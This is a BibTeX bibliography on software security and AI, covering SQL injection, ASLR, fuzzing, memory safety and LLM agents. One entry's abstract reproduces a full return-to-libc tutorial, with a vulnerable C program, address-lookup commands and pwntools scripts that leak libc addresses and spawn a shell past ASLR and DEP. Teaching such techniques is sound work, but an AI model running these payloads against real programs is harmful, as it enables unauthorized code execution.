
@inproceedings{boyd_sqlrand_2004,
	address = {Berlin, Heidelberg},
	title = {{SQLrand}: {Preventing} {SQL} {Injection} {Attacks}},
	isbn = {978-3-540-24852-1},
	shorttitle = {{SQLrand}},
	doi = {10.1007/978-3-540-24852-1_21},
	abstract = {We present a practical protection mechanism against SQL injection attacks. Such attacks target databases that are accessible through a web front-end, and take advantage of flaws in the input validation logic of Web components such as CGI scripts. We apply the concept of instruction-set randomization to SQL, creating instances of the language that are unpredictable to the attacker. Queries injected by the attacker will be caught and terminated by the database parser. We show how to use this technique with the MySQL database using an intermediary proxy that translates the random SQL to its standard language. Our mechanism imposes negligible performance overhead to query processing and can be easily retrofitted to existing systems.},
	language = {en},
	booktitle = {Applied {Cryptography} and {Network} {Security}},
	publisher = {Springer},
	author = {Boyd, Stephen W. and Keromytis, Angelos D.},
	editor = {Jakobsson, Markus and Yung, Moti and Zhou, Jianying},
	year = {2004},
	keywords = {Error Message, Injection Attack, Syntax Error, Template Query, USENIX Security Symposium},
	pages = {292--302},
}

@misc{noauthor_what_nodate,
	title = {What is {SQL} {Injection}? {Tutorial} \& {Examples} {\textbar} {Web} {Security} {Academy}},
	shorttitle = {What is {SQL} {Injection}?},
	url = {https://portswigger.net/web-security/sql-injection},
	abstract = {In this section, we explain: What SQL injection (SQLi) is. How to find and exploit different types of SQLi vulnerabilities. How to prevent SQLi. Labs If ...},
	urldate = {2025-07-02},
}

@misc{china_what_2025,
	title = {What {Is} {API} {Security}? {\textbar} {IBM}},
	shorttitle = {What {Is} {API} {Security}?},
	url = {https://www.ibm.com/think/topics/api-security},
	abstract = {API security is a set of practices and procedures that protect application programming interfaces (APIs) and the data they transmit from misuse, malicious bot attacks and other cybersecurity threats.},
	language = {en},
	urldate = {2025-07-02},
	author = {China, Chrystal and Goodwin, Michael},
	month = may,
	year = {2025},
}

@misc{rina_diane_caballar_move_2023,
	title = {The {Move} to {Memory}-{Safe} {Programming} - {IEEE} {Spectrum}},
	url = {https://spectrum.ieee.org/memory-safe-programming-languages},
	abstract = {Shifting from C and C++ to memory-safe programming languages like Rust is gaining ground},
	language = {en},
	urldate = {2025-06-30},
	author = {{Rina Diane Caballar}},
	month = mar,
	year = {2023},
}

@misc{michiel_lemmens_stack_2021,
	title = {Stack {Canaries} – {Gingerly} {Sidestepping} the {Cage} {\textbar} {SANS} {Institute}},
	url = {https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/},
	urldate = {2025-06-30},
	author = {{Michiel Lemmens}},
	month = feb,
	year = {2021},
}

@article{beaman_fuzzing_2022,
	title = {Fuzzing vulnerability discovery techniques: {Survey}, challenges and future directions},
	volume = {120},
	issn = {01674048},
	shorttitle = {Fuzzing vulnerability discovery techniques},
	url = {https://linkinghub.elsevier.com/retrieve/pii/S0167404822002073},
	doi = {10.1016/j.cose.2022.102813},
	abstract = {Fuzzing is a powerful tool for vulnerability discovery in software, with much progress being made in the ﬁeld in recent years. There is limited literature available on the fuzzing vulnerability discovery approaches. Hence, in this paper, an attempt has been made to explore the recent advances in the area of fuzzing vulnerability discovery and to propose a reﬁnement to the classiﬁcation of fuzzers. Furthermore, we have identiﬁed key research challenges and potential future areas of research that might provide new insight to researchers.},
	language = {en},
	urldate = {2025-06-30},
	journal = {Computers \& Security},
	author = {Beaman, Craig and Redbourne, Michael and Mummery, J. Darren and Hakak, Saqib},
	month = sep,
	year = {2022},
	pages = {102813},
}

@misc{noauthor_fact_2024,
	title = {Fact {Sheet}: {ONCD} {Report} {Calls} for {Adoption} of {Memory} {Safe} {Programming} {Languages} and {Addressing} the {Hard} {Research} {Problem} of {Software} {Measurability} {\textbar} {ONCD}},
	shorttitle = {Fact {Sheet}},
	url = {https://bidenwhitehouse.archives.gov/oncd/briefing-room/2024/02/26/memory-safety-fact-sheet/},
	abstract = {ONCD Rallies Industry, Academia, and Civil Society to Join Effort February 26, 2024 Read the full report here Watch the video address here Today, the Office of the National Cyber Director (ONCD) published a technical report entitled “Back to the Building Blocks: A Path Toward Secure and Measurable Software.” The report builds upon the President’s…},
	language = {en-US},
	urldate = {2025-06-29},
	journal = {The White House},
	month = feb,
	year = {2024},
}

@misc{gallucci_aslr_2024,
	title = {{ASLR}, bypass techniques, and circumvention impacts},
	url = {https://oliviagallucci.com/aslr-bypass-techniques-and-circumvention-impacts/},
	abstract = {Address space layout randomization (ASLR) randomizes memory addresses used by system and application processes.},
	language = {en-US},
	urldate = {2025-06-29},
	journal = {Olivia A. Gallucci},
	author = {Gallucci, Olivia A.},
	month = oct,
	year = {2024},
}

@misc{sporici_bypassing_2019,
	title = {Bypassing {ASLR} and {DEP} - {Getting} {Shells} with pwntools},
	url = {https://codingvision.net/bypassing-aslr-dep-getting-shells-with-pwntools},
	abstract = {Today, I’d like to take some time and to present a short trick to bypass both ASLR (Address Space Layout Randomization) and DEP (Data Execution Prevention) in order to obtain a shell in a buffer-overflow vulnerable binary. I’ve seen this problem discussed using return-to-PLT strategies, which is fine if your targeted method is already used in the binary – although, let’s face it, not many programs will call system() or exec() and invite you to spawn shells. This approach revolves around a return-to-libc attack in which the attacker first leaks the address of a known function (e.g.: puts()) and then computes the offset between that known function and the targeted function (e.g.: system()). By summing the 2 values, the result is the address of the function that we want to call using the exploit. If you understood this part, you only need to prepare the payloads. Given a vulnerable binary, let’s consider the following scenario: ASLR is enabled DEP is enabled Only gets() and puts() are called in the binary Running on a x64 system (no brute-force) For the sake of simplicity: no stack protectors (no canary values) The attacker knows which libc version is used by the binary Vulnerable Binary While writing this, I’ve been using this really simple binary (vuln.c): 1 2 3 4 5 6 7 8 9 10 11 \#include{\textless}stdio.h{\textgreater} int main() \{ char buffer[40]; gets(buffer); printf("hi there{\textbackslash}n"); return 0; \} Compiled with the following parameters: 1 gcc -Wall -ansi -fno-stack-protector vuln.c -o vuln Step 1: Basic Buffer Overflow We start by finding the offset in order to overwrite the return address and perform a simple execution hijacking. There are multiple ways of doing this: you can either start with a payload of a random size and analyze the behavior of the binary in a debugger (like GDB) such as the image below, where we overwrite the return address and the RIP (PC) jumps to 0x414241424142 (“ABABAB”) Finding the offset for a buffer overflow attack by trial-and-error I usually test this with an address that calls a specific function or jumps back to the start of the program (0x400566) The ‘main’ address is used to call the program multiple times and supply multiple payloads Should you succeed, it will print twice the same message: Running the same program twice to prevent ASLR re-randomization Why is this important? It is important because ASLR randomizes the heap, stack and the offsets where are mapped the libraries (such as libc) only when the binary is launched into execution. Calling main once again will not trigger a re-randomization. This means we can submit multiple payloads while having fixed offsets (mitigating the effect of ASLR). Step 2: Leaking the Address of puts@libc This is the difficult part. Multiple payloads are required in order to spawn a shell using this binary. Basically, you’ll want to leak the address of puts() using a puts@PLT() call and then compute the address of system() by having access to libc. Additionally, you’ll want to compute the address of a “sh” string, in order to achieve a system("sh") call. You’ll have to use a second payload to perform the aforementioned call. I recommend you perform these steps using a framework like pwntools since the the second payload must be adapted using information leaked at runtime. To continue, one must understand the role of the GOT (Global Offset Table) in a binary as there is no exact way of previously knowing where ASLR will map each external library of the current process. Running ldd reveals different mapping addresses of libc each time the process starts The addresses of the external methods are usually determined at runtime when these methods are called for the first time (i.e.: when the PLT trampoline is executed for the first time). However, the addresses need to be referenced in the original code before the program runs -{\textgreater} so placeholders (fixed addresses / @GOT addresses) are used. GOT acts as a dictionary and binds the placeholder addresses to the real/external addresses (in the library). The values of the GOT are determined and written by the dynamic address solver (linker) once a method is called. In our first payload, we’ll want to use GOT addresses (placeholders) instead of external addresses (which are randomized). One interesting observation is that calling puts(puts@GOT) will actually output the external address of puts@libc. We’ll want our initial payload to perform such a call in order to have an initial idea of where the libc is mapped. Start by running the following command so you can view the address of puts@GOT: 1 objdump -R vuln Pay attention at the second row and write down the address: 1 2 3 4 5 6 OFFSET TYPE VALUE 0000000000600ff8 R\_X86\_64\_GLOB\_DAT \_\_gmon\_start\_\_ {\textgreater} 0000000000601018 R\_X86\_64\_JUMP\_SLOT puts@GLIBC\_2.2.5 0000000000601020 R\_X86\_64\_JUMP\_SLOT \_\_libc\_start\_main@GLIBC\_2.2.5 0000000000601028 R\_X86\_64\_JUMP\_SLOT gets@GLIBC\_2.2.5 Next, you’ll need a ROP gadget that takes a parameter from the stack and places it into the RDI register (in our case, takes the @GOT address from our payload, from the stack, and sets it as the first parameter for a future puts@PLT call). As you remember, we’re running on a x64 architecture and the calling convention states that the first parameter of a method must be placed in the RDI register. We’re looking for a POP RDI; RET gadget – I’m doing this using ROPgadget (so it’s ROPgadget --binary vuln) but feel free to use whatever you’re comfortable with (GDB, radare2, etc.). We’ll get the following line: 0x00000000004005f3 : pop rdi ; ret The last thing that the payload requires is a way to call puts(). We can achieve this by calling puts@PLT (through the PLT trampoline) since its address is also fixed and unaffected by ASLR. You can use something like this to extract the address from the binary: 1 objdump -d -M intel vuln {\textbar} grep "puts@plt" I got something like this: 0000000000400430 {\textless}puts@plt{\textgreater}: Finally, we can construct the first payload. I’ll write this as a pwntools python script so I’ll be able to expand it and include the second payload. The new flow of the program must be the following: RET to pop\_rdi\_ret\_address -{\textgreater} (RDI = puts@GOT) RET to puts\_plt\_address -{\textgreater} RET to main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from pwn import * r = process('vuln') main\_address = 0x00400566 puts\_got\_address = 0x0000000000601018 puts\_plt\_address = 0x0000000000400430 pop\_rdi\_ret\_address = 0x00000000004005f3 payload = 'A'*56 + p64(pop\_rdi\_ret\_address) + p64(puts\_got\_address) + p64(puts\_plt\_address) + p64(main\_address) r.sendline(payload) print r.recvline() \# "hi there" leaked\_output = r.recvline() leaked\_output = leaked\_output[:-1] print('leaked puts() address', leaked\_output) r.sendline('a') print r.recvline() \# "hi there" And when running it… Leaking the address of puts@libc Step 3: Finding the Address of system@libc In this part, we compute the offset between puts@libc and system@libc while also finding the address of a “sh” string. We know, from the previous ldd run, that the binary uses the libc located at: /lib/x86\_64-linux-gnu/libc.so.6. Running the following commands will return the offsets of system() and puts() from libc: 1 2 objdump -d -M intel /lib/x86\_64-linux-gnu/libc.so.6 {\textbar} grep "system" objdump -d -M intel /lib/x86\_64-linux-gnu/libc.so.6 {\textbar} grep "\_IO\_puts" The lines of interest are: 1 2 0000000000045390 {\textless}\_\_libc\_system@@GLIBC\_PRIVATE{\textgreater}: 000000000006f690 {\textless}\_IO\_puts@@GLIBC\_2.2.5{\textgreater}: I found the offset of the “sh” string inside libc using radare2. Pick one. Offsets of various ‘sh’ strings inside libc (radare2) Subtracting puts()’s offset from the leaked puts@libc address gives us the base address of libc (the start of the memory region where it is mapped for the current process). By adding the offset of system() we get a call to system@libc. Now, we can adapt the previous script in order to create the second payload that makes the call. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from pwn import * r = process('vuln') main\_address = 0x00400566 puts\_got\_address = 0x0000000000601018 puts\_plt\_address = 0x0000000000400430 pop\_rdi\_ret\_address = 0x00000000004005f3 puts\_libc\_offset = 0x000000000006f690 system\_libc\_offset = 0x0000000000045390 sh\_libc\_offset = 0x00011e70 payload = 'A'*56 + p64(pop\_rdi\_ret\_address) + p64(puts\_got\_address) + p64(puts\_plt\_address) + p64(main\_address) r.sendline(payload) print r.recvline() leaked\_output = r.recvline() leaked\_output = leaked\_output[:-1] print('leaked puts() address', leaked\_output) leaked\_output += '{\textbackslash}x00{\textbackslash}x00' puts\_libc\_address = u64(leaked\_output) system\_libc\_address = puts\_libc\_address - puts\_libc\_offset + system\_libc\_offset print('system() address', p64(system\_libc\_address)) sh\_libc\_address = puts\_libc\_address - puts\_libc\_offset + sh\_libc\_offset payload = 'A'*56 + p64(pop\_rdi\_ret\_address) + p64(sh\_libc\_address) + p64(system\_libc\_address) + p64(main\_address) r.sendline(payload) print(r.recvline()) \# hi there \#r.sendline(payload) r.interactive() Small Proof-Of-Concept Here is a small PoC, representing the final result. For reference, the VM runs 64 bit image of Ubuntu 16.04 Xenial with glibc 2.23 (md5(libc.so.6): 8c0d248ea33e6ef17b759fa5d81dda9e), pwntools 4.0.1 and Python 2.7. Upon receiving an email (thanks Stefan), I’ve noticed that I was sending the payload twice (had 2x r.sendline(payload)); this caused the weird “not found” message in the shell. I commented it out in the code above but left the image in case someone has this issue too. Proof-Of-Concept: Shell spawned inside a Process with ASLR and DEP CodeProject},
	urldate = {2025-06-29},
	journal = {coding.vision},
	author = {Sporici, Dan},
	month = jul,
	year = {2019},
}

@misc{syedishrarali_aslr_2024,
	title = {{ASLR}: {Address} {Space} {Layout} {Randomization}},
	shorttitle = {{ASLR}},
	url = {https://medium.com/@syedishrarali/aslr-address-space-layout-randomization-eb94203a0e7d},
	abstract = {From Basics to Advanced: Understanding and Navigating ASLR Implementation in PE Files},
	language = {en},
	urldate = {2025-06-29},
	journal = {Medium},
	author = {Syedishrarali},
	month = nov,
	year = {2024},
}

@misc{noauthor_zos_2021,
	title = {z/{OS}},
	copyright = {© Copyright IBM Corporation 2020},
	url = {https://www.ibm.com/docs/en/zos/2.4.0?topic=overview-address-space-layout-randomization},
	abstract = {IBM Documentation.},
	language = {en-US},
	urldate = {2025-06-29},
	month = apr,
	year = {2021},
}

@misc{aleph_one_smashing_1996,
	title = {Smashing {The} {Stack} {For} {Fun} {And} {Profit}},
	url = {https://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf},
	publisher = {Phrack},
	author = {{Aleph One}},
	year = {1996},
}

@misc{chen_parallel_2025,
	title = {Parallel {Scaling} {Law} for {Language} {Models}},
	url = {http://arxiv.org/abs/2505.10475},
	doi = {10.48550/arXiv.2505.10475},
	abstract = {It is commonly believed that scaling language models should commit a significant space or time cost, by increasing the parameters (parameter scaling) or output tokens (inference-time scaling). We introduce the third and more inference-efficient scaling paradigm: increasing the model's parallel computation during both training and inference time. We apply \$P\$ diverse and learnable transformations to the input, execute forward passes of the model in parallel, and dynamically aggregate the \$P\$ outputs. This method, namely parallel scaling (ParScale), scales parallel computation by reusing existing parameters and can be applied to any model structure, optimization procedure, data, or task. We theoretically propose a new scaling law and validate it through large-scale pre-training, which shows that a model with \$P\$ parallel streams is similar to scaling the parameters by \$O({\textbackslash}log P)\$ while showing superior inference efficiency. For example, ParScale can use up to 22\${\textbackslash}times\$ less memory increase and 6\${\textbackslash}times\$ less latency increase compared to parameter scaling that achieves the same performance improvement. It can also recycle an off-the-shelf pre-trained model into a parallelly scaled one by post-training on a small amount of tokens, further reducing the training budget. The new scaling law we discovered potentially facilitates the deployment of more powerful models in low-resource scenarios, and provides an alternative perspective for the role of computation in machine learning.},
	urldate = {2025-06-19},
	publisher = {arXiv},
	author = {Chen, Mouxiang and Hui, Binyuan and Cui, Zeyu and Yang, Jiaxi and Liu, Dayiheng and Sun, Jianling and Lin, Junyang and Liu, Zhongxin},
	month = may,
	year = {2025},
	note = {arXiv:2505.10475 [cs]},
	keywords = {Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{merritt_what_2025,
	title = {What {Is} {Retrieval}-{Augmented} {Generation} aka {RAG}?},
	url = {https://blogs.nvidia.com/blog/what-is-retrieval-augmented-generation/},
	abstract = {Retrieval-augmented generation (RAG) is a technique for enhancing the accuracy and reliability of generative AI models with facts fetched from external sources.},
	language = {en-US},
	urldate = {2025-06-19},
	journal = {NVIDIA Blog},
	author = {Merritt, Rick},
	month = jan,
	year = {2025},
}

@misc{noauthor_what_2025,
	title = {What {Is} {Agentic} {AI}? {\textbar} {IBM}},
	shorttitle = {What {Is} {Agentic} {AI}?},
	url = {https://www.ibm.com/think/topics/agentic-ai},
	abstract = {Agentic AI is an artificial intelligence system that can accomplish a specific goal with limited supervision. It consists of ai agents—machine learning models that mimic human decision-making to solve problems in real time.},
	language = {en},
	urldate = {2025-06-18},
	month = feb,
	year = {2025},
}

@misc{pounds_what_2024,
	title = {What {Is} {Agentic} {AI}?},
	url = {https://blogs.nvidia.com/blog/what-is-agentic-ai/},
	abstract = {Agentic AI connects to enterprise data and uses sophisticated reasoning and iterative planning to  autonomously solve complex, multi-step problems.},
	language = {en-US},
	urldate = {2025-06-17},
	journal = {NVIDIA Blog},
	author = {Pounds, Erik},
	month = oct,
	year = {2024},
}

@misc{team_qwq_2024,
	title = {{QwQ}: {Reflect} {Deeply} on the {Boundaries} of the {Unknown}},
	shorttitle = {{QwQ}},
	url = {https://qwenlm.github.io/blog/qwq-32b-preview/},
	abstract = {GITHUB HUGGING FACE MODELSCOPE DEMO DISCORD
Note: This is the pronunciation of QwQ: /kwju:/ , similar to the word “quill”.
What does it mean to think, to question, to understand? These are the deep waters that QwQ (Qwen with Questions) wades into. Like an eternal student of wisdom, it approaches every problem - be it mathematics, code, or knowledge of our world - with genuine wonder and doubt. QwQ embodies that ancient philosophical spirit: it knows that it knows nothing, and that’s precisely what drives its curiosity.},
	language = {en},
	urldate = {2025-04-02},
	journal = {Qwen},
	author = {Team, Qwen},
	month = nov,
	year = {2024},
	note = {Section: blog},
}

@misc{team_gemma_2024,
	title = {Gemma: {Open} {Models} {Based} on {Gemini} {Research} and {Technology}},
	shorttitle = {Gemma},
	url = {http://arxiv.org/abs/2403.08295},
	doi = {10.48550/arXiv.2403.08295},
	abstract = {This work introduces Gemma, a family of lightweight, state-of-the art open models built from the research and technology used to create Gemini models. Gemma models demonstrate strong performance across academic benchmarks for language understanding, reasoning, and safety. We release two sizes of models (2 billion and 7 billion parameters), and provide both pretrained and fine-tuned checkpoints. Gemma outperforms similarly sized open models on 11 out of 18 text-based tasks, and we present comprehensive evaluations of safety and responsibility aspects of the models, alongside a detailed description of model development. We believe the responsible release of LLMs is critical for improving the safety of frontier models, and for enabling the next wave of LLM innovations.},
	urldate = {2025-04-02},
	publisher = {arXiv},
	author = {Team, Gemma and Mesnard, Thomas and Hardin, Cassidy and Dadashi, Robert and Bhupatiraju, Surya and Pathak, Shreya and Sifre, Laurent and Rivière, Morgane and Kale, Mihir Sanjay and Love, Juliette and Tafti, Pouya and Hussenot, Léonard and Sessa, Pier Giuseppe and Chowdhery, Aakanksha and Roberts, Adam and Barua, Aditya and Botev, Alex and Castro-Ros, Alex and Slone, Ambrose and Héliou, Amélie and Tacchetti, Andrea and Bulanova, Anna and Paterson, Antonia and Tsai, Beth and Shahriari, Bobak and Lan, Charline Le and Choquette-Choo, Christopher A. and Crepy, Clément and Cer, Daniel and Ippolito, Daphne and Reid, David and Buchatskaya, Elena and Ni, Eric and Noland, Eric and Yan, Geng and Tucker, George and Muraru, George-Christian and Rozhdestvenskiy, Grigory and Michalewski, Henryk and Tenney, Ian and Grishchenko, Ivan and Austin, Jacob and Keeling, James and Labanowski, Jane and Lespiau, Jean-Baptiste and Stanway, Jeff and Brennan, Jenny and Chen, Jeremy and Ferret, Johan and Chiu, Justin and Mao-Jones, Justin and Lee, Katherine and Yu, Kathy and Millican, Katie and Sjoesund, Lars Lowe and Lee, Lisa and Dixon, Lucas and Reid, Machel and Mikuła, Maciej and Wirth, Mateo and Sharman, Michael and Chinaev, Nikolai and Thain, Nithum and Bachem, Olivier and Chang, Oscar and Wahltinez, Oscar and Bailey, Paige and Michel, Paul and Yotov, Petko and Chaabouni, Rahma and Comanescu, Ramona and Jana, Reena and Anil, Rohan and McIlroy, Ross and Liu, Ruibo and Mullins, Ryan and Smith, Samuel L. and Borgeaud, Sebastian and Girgin, Sertan and Douglas, Sholto and Pandya, Shree and Shakeri, Siamak and De, Soham and Klimenko, Ted and Hennigan, Tom and Feinberg, Vlad and Stokowiec, Wojciech and Chen, Yu-hui and Ahmed, Zafarali and Gong, Zhitao and Warkentin, Tris and Peran, Ludovic and Giang, Minh and Farabet, Clément and Vinyals, Oriol and Dean, Jeff and Kavukcuoglu, Koray and Hassabis, Demis and Ghahramani, Zoubin and Eck, Douglas and Barral, Joelle and Pereira, Fernando and Collins, Eli and Joulin, Armand and Fiedel, Noah and Senter, Evan and Andreev, Alek and Kenealy, Kathleen},
	month = apr,
	year = {2024},
	note = {arXiv:2403.08295 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language},
}

@misc{deepseek-ai_deepseek-r1_2025,
	title = {{DeepSeek}-{R1}: {Incentivizing} {Reasoning} {Capability} in {LLMs} via {Reinforcement} {Learning}},
	shorttitle = {{DeepSeek}-{R1}},
	url = {http://arxiv.org/abs/2501.12948},
	doi = {10.48550/arXiv.2501.12948},
	abstract = {We introduce our first-generation reasoning models, DeepSeek-R1-Zero and DeepSeek-R1. DeepSeek-R1-Zero, a model trained via large-scale reinforcement learning (RL) without supervised fine-tuning (SFT) as a preliminary step, demonstrates remarkable reasoning capabilities. Through RL, DeepSeek-R1-Zero naturally emerges with numerous powerful and intriguing reasoning behaviors. However, it encounters challenges such as poor readability, and language mixing. To address these issues and further enhance reasoning performance, we introduce DeepSeek-R1, which incorporates multi-stage training and cold-start data before RL. DeepSeek-R1 achieves performance comparable to OpenAI-o1-1217 on reasoning tasks. To support the research community, we open-source DeepSeek-R1-Zero, DeepSeek-R1, and six dense models (1.5B, 7B, 8B, 14B, 32B, 70B) distilled from DeepSeek-R1 based on Qwen and Llama.},
	urldate = {2025-04-02},
	publisher = {arXiv},
	author = {DeepSeek-AI and Guo, Daya and Yang, Dejian and Zhang, Haowei and Song, Junxiao and Zhang, Ruoyu and Xu, Runxin and Zhu, Qihao and Ma, Shirong and Wang, Peiyi and Bi, Xiao and Zhang, Xiaokang and Yu, Xingkai and Wu, Yu and Wu, Z. F. and Gou, Zhibin and Shao, Zhihong and Li, Zhuoshu and Gao, Ziyi and Liu, Aixin and Xue, Bing and Wang, Bingxuan and Wu, Bochao and Feng, Bei and Lu, Chengda and Zhao, Chenggang and Deng, Chengqi and Zhang, Chenyu and Ruan, Chong and Dai, Damai and Chen, Deli and Ji, Dongjie and Li, Erhang and Lin, Fangyun and Dai, Fucong and Luo, Fuli and Hao, Guangbo and Chen, Guanting and Li, Guowei and Zhang, H. and Bao, Han and Xu, Hanwei and Wang, Haocheng and Ding, Honghui and Xin, Huajian and Gao, Huazuo and Qu, Hui and Li, Hui and Guo, Jianzhong and Li, Jiashi and Wang, Jiawei and Chen, Jingchang and Yuan, Jingyang and Qiu, Junjie and Li, Junlong and Cai, J. L. and Ni, Jiaqi and Liang, Jian and Chen, Jin and Dong, Kai and Hu, Kai and Gao, Kaige and Guan, Kang and Huang, Kexin and Yu, Kuai and Wang, Lean and Zhang, Lecong and Zhao, Liang and Wang, Litong and Zhang, Liyue and Xu, Lei and Xia, Leyi and Zhang, Mingchuan and Zhang, Minghua and Tang, Minghui and Li, Meng and Wang, Miaojun and Li, Mingming and Tian, Ning and Huang, Panpan and Zhang, Peng and Wang, Qiancheng and Chen, Qinyu and Du, Qiushi and Ge, Ruiqi and Zhang, Ruisong and Pan, Ruizhe and Wang, Runji and Chen, R. J. and Jin, R. L. and Chen, Ruyi and Lu, Shanghao and Zhou, Shangyan and Chen, Shanhuang and Ye, Shengfeng and Wang, Shiyu and Yu, Shuiping and Zhou, Shunfeng and Pan, Shuting and Li, S. S. and Zhou, Shuang and Wu, Shaoqing and Ye, Shengfeng and Yun, Tao and Pei, Tian and Sun, Tianyu and Wang, T. and Zeng, Wangding and Zhao, Wanjia and Liu, Wen and Liang, Wenfeng and Gao, Wenjun and Yu, Wenqin and Zhang, Wentao and Xiao, W. L. and An, Wei and Liu, Xiaodong and Wang, Xiaohan and Chen, Xiaokang and Nie, Xiaotao and Cheng, Xin and Liu, Xin and Xie, Xin and Liu, Xingchao and Yang, Xinyu and Li, Xinyuan and Su, Xuecheng and Lin, Xuheng and Li, X. Q. and Jin, Xiangyue and Shen, Xiaojin and Chen, Xiaosha and Sun, Xiaowen and Wang, Xiaoxiang and Song, Xinnan and Zhou, Xinyi and Wang, Xianzu and Shan, Xinxia and Li, Y. K. and Wang, Y. Q. and Wei, Y. X. and Zhang, Yang and Xu, Yanhong and Li, Yao and Zhao, Yao and Sun, Yaofeng and Wang, Yaohui and Yu, Yi and Zhang, Yichao and Shi, Yifan and Xiong, Yiliang and He, Ying and Piao, Yishi and Wang, Yisong and Tan, Yixuan and Ma, Yiyang and Liu, Yiyuan and Guo, Yongqiang and Ou, Yuan and Wang, Yuduan and Gong, Yue and Zou, Yuheng and He, Yujia and Xiong, Yunfan and Luo, Yuxiang and You, Yuxiang and Liu, Yuxuan and Zhou, Yuyang and Zhu, Y. X. and Xu, Yanhong and Huang, Yanping and Li, Yaohui and Zheng, Yi and Zhu, Yuchen and Ma, Yunxian and Tang, Ying and Zha, Yukun and Yan, Yuting and Ren, Z. Z. and Ren, Zehui and Sha, Zhangli and Fu, Zhe and Xu, Zhean and Xie, Zhenda and Zhang, Zhengyan and Hao, Zhewen and Ma, Zhicheng and Yan, Zhigang and Wu, Zhiyu and Gu, Zihui and Zhu, Zijia and Liu, Zijun and Li, Zilin and Xie, Ziwei and Song, Ziyang and Pan, Zizheng and Huang, Zhen and Xu, Zhipeng and Zhang, Zhongyu and Zhang, Zhen},
	month = jan,
	year = {2025},
	note = {arXiv:2501.12948 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{fang_teams_2024,
	title = {Teams of {LLM} {Agents} can {Exploit} {Zero}-{Day} {Vulnerabilities}},
	url = {http://arxiv.org/abs/2406.01637},
	doi = {10.48550/arXiv.2406.01637},
	abstract = {LLM agents have become increasingly sophisticated, especially in the realm of cybersecurity. Researchers have shown that LLM agents can exploit real-world vulnerabilities when given a description of the vulnerability and toy capture-the-flag problems. However, these agents still perform poorly on real-world vulnerabilities that are unknown to the agent ahead of time (zero-day vulnerabilities). In this work, we show that teams of LLM agents can exploit real-world, zero-day vulnerabilities. Prior agents struggle with exploring many different vulnerabilities and long-range planning when used alone. To resolve this, we introduce HPTSA, a system of agents with a planning agent that can launch subagents. The planning agent explores the system and determines which subagents to call, resolving long-term planning issues when trying different vulnerabilities. We construct a benchmark of 15 real-world vulnerabilities and show that our team of agents improve over prior work by up to 4.5\${\textbackslash}times\$.},
	urldate = {2025-03-12},
	publisher = {arXiv},
	author = {Fang, Richard and Bindu, Rohan and Gupta, Akul and Zhan, Qiusi and Kang, Daniel},
	month = jun,
	year = {2024},
	note = {arXiv:2406.01637 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Multiagent Systems},
}

@misc{hartford_uncensored_2023,
	title = {Uncensored {Models}},
	url = {https://erichartford.com/uncensored-models},
	abstract = {I am publishing this because many people are asking me how I did it, so I will explain.
https://huggingface.co/ehartford/WizardLM-30B-Uncensored
https://huggingface.co/ehartford/WizardLM-13B-Uncensored
https://huggingface.co/ehartford/WizardLM-7B-Unc...},
	language = {en},
	urldate = {2025-03-04},
	journal = {Cognitive Computations},
	author = {Hartford, Eric},
	month = may,
	year = {2023},
}

@article{noauthor_pdf_2024,
	title = {({PDF}) {CyExec}*: {A} {High}-{Performance} {Container}-{Based} {Cyber} {Range} {With} {Scenario} {Randomization}},
	shorttitle = {({PDF}) {CyExec}*},
	url = {https://www.researchgate.net/publication/353789873_CyExec_A_High-Performance_Container-Based_Cyber_Range_With_Scenario_Randomization},
	doi = {10.1109/ACCESS.2021.3101245},
	abstract = {PDF {\textbar} With increasing threats to information security, information security education through practical exercises specifically cyber range has attracted... {\textbar} Find, read and cite all the research you need on ResearchGate},
	language = {en},
	urldate = {2024-12-07},
	journal = {ResearchGate},
	month = oct,
	year = {2024},
}

@article{chouliaras_novel_2023,
	title = {A novel autonomous container-based platform for cybersecurity training and research},
	volume = {9},
	issn = {2376-5992},
	url = {https://www.ncbi.nlm.nih.gov/pmc/articles/PMC10495954/},
	doi = {10.7717/peerj-cs.1574},
	abstract = {Cyberattacks, particularly those targeting systems that store or handle sensitive data, have become more sophisticated in recent years. To face increasing threats, continuous capacity building and digital skill competence are needed. Cybersecurity hands-on training is essential to upskill cybersecurity professionals. However, the cost of developing and maintaining a cyber range platform is high. Setting up an ideal digital environment for cybersecurity exercises can be challenging and often need to invest a lot of time and system resources in this process. In this article, we present a lightweight cyber range platform that was developed under the open-source cloud platform OpenStack, based on Docker technology using IaC methodology. Combining the advantages of Docker technology, DevOps automation capabilities, and the cloud platform, the proposed cyber range platform achieves the maximization of performance and scalability while reducing costs and resources.},
	urldate = {2024-12-07},
	journal = {PeerJ Computer Science},
	author = {Chouliaras, Nestoras and Kantzavelou, Ioanna and Maglaras, Leandros and Pantziou, Grammati and Amine Ferrag, Mohamed},
	month = sep,
	year = {2023},
	pmid = {37705644},
	pmcid = {PMC10495954},
	pages = {e1574},
}

@misc{noauthor_pedagogy_nodate,
	title = {Pedagogy - {Diversifying} {Your} {Teaching} {Methods}, {Learning} {Activities}, and {Assignments} {\textbar} {Center} for {Educational} {Innovation}},
	url = {https://cei.umn.edu/teaching-resources/inclusive-teaching-predominantly-white-institution/pedagogy-diversifying-your-teaching-methods-learning-activities-and-assignments},
	urldate = {2024-12-01},
}

@article{zacharis_aicef_2023,
	title = {{AiCEF}: an {AI}-assisted cyber exercise content generation framework using named entity recognition},
	volume = {22},
	issn = {1615-5270},
	shorttitle = {{AiCEF}},
	url = {https://doi.org/10.1007/s10207-023-00693-z},
	doi = {10.1007/s10207-023-00693-z},
